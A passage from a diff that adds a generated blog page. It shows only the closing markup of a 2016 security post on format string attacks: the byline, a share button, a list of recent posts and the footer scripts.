style="margin-left: 1em; margin-right: 1em;"><img border="0" height="172" src="https://1.bp.blogspot.com/-_jJwA0xwqiU/Vt-C1byzFCI/AAAAAAAAA8o/Os6qzvfLkBw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A56%253A27.png" width="640" /></a></div><br /></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2016-03-08T17:58:00-08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span> <span class='time'>5:58 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2016/03/08/format-string-atack/" data-via="" data-counturl="http://securitysignal.github.io/blog/2016/03/08/format-string-atack/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/" title="Previous Post: Ringzer0 Level4 Pwned! by hdbreaker">&laquo; Ringzer0 Level4 Pwned! by hdbreaker</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
